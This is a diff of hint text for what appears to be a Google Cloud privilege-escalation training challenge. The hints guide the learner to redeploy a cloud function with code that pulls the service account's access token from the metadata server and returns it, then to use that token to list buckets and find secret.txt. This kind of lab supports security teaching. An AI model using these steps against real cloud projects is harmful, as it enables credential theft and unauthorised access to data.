@@ -14,21 +14,23 @@ which is located in a file called secret.txt in a private bucket on the project.
 ---
 <p>List the cloud functions in the project:</p>
 <pre>gcloud functions list</pre>
+<p>Then, get more information about the function that you find, including its httpsTrigger:</p>
+<pre>gcloud functions describe [function]</pre>
 ---
-<p>Try calling the function using the service account's access token:</p>
-<pre>curl https://[location]-[project-id].cloudfunctions.net/[function-name] -H "Authorization: Bearer $(gcloud auth print-identity-token)"</pre>
+<p>Try calling the function using the service account's token:</p>
+<pre>curl [httpsTrigger] -H "Authorization: Bearer $(gcloud auth print-identity-token)"</pre>
 ---
 <p>The function doesn't seem to do anything useful with its current code, but you have the permission cloudfunctions.functions.sourceCodeSet.</p>
 ---
 <p>Modify the function's code using:</p>
-<pre>gcloud functions deploy [function-name] --source=[path/to/code]</pre>
+<pre>gcloud functions deploy [function] --source=[path/to/code]</pre>
 <p>Information on how to write cloud functions can be found <a class="inline" href="https://cloud.google.com/functions/docs/writing/http#writing_http_helloworld-python">here</a>, and information on how to use libraries can be found <a class="inline" href="https://cloud.google.com/functions/docs/writing/specifying-dependencies-python">here</a>.</p>
 ---
 <p>Cloud functions either have their own service accounts or use the default cloud function service account in order to access other resources, so a cloud function can have more permissions than its caller. Try to gain access to the cloud function's service account.</p>
 ---
 <p>Cloud functions get identity and access tokens from the Compute Metadata Server. Get an access token for the function from the metadata server. Information about how to do so can be found <a class="inline" href="https://cloud.google.com/functions/docs/securing/function-identity#fetching_identity_and_access_tokens">here</a>.</p>
 ---
-<p>The url to get an access token from the metadata server is http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token</p>
+<p>The URL to get an access token from the metadata server is http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token</p>
 <p>To have the function return the access token, create the following files:</p>
 <h3>function/main.py</h3>
 <pre>import requests
@@ -40,7 +42,7 @@ def main(request):
 <h3>function/requirements.txt</h3>
 <pre>requests</pre>
 <p>Deploy the new code:</p>
-<pre>gcloud functions deploy [function-name] --source=./function</pre>
+<pre>gcloud functions deploy [function] --source=./function --trigger-http --runtime=python38</pre>
 <p>Then, call the function to get its access token.</p>
 ---
 <p>Test the permissions of the token using the test-permissions.py script.</p>
@@ -78,7 +80,7 @@ def main(request):
       ]
     }'</textarea>
 ---
-<p>Now that you have permission to view and list buckets and objects, find secret.txt.</p>
+<p>Now that you have permission to view and list buckets and objects, find secret.txt. Note that you may need to re-activate the initial service account credential to refresh the access token with the new permissions you set.</p>
 ---
 <pre>gsutil ls
 gsutil ls [bucket-name]
